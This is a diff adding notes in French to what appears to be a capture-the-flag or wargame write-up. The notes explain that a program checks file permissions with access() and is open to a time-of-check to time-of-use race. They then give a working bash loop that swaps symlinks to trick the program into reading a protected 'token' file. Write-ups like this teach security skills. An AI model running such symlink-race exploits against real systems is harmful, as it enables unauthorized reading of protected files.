@@ -162,6 +162,13 @@ un fichier qui contient "aaaaaaa" est envoye
 aaaaaaaaa
 ```
 
+le programme utilise access to check si l'utilisateur a acces au fichier qu'il envoie
+le programme est donc vulnerable au TOCTOU https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use
+
+for (( ; ; )) ; do echo coucou > /tmp/coucou; ln -fs /tmp/coucou /tmp/dull; ln -fs $(pwd)/token /tmp/dull; done &
+
+
+
 
 
 
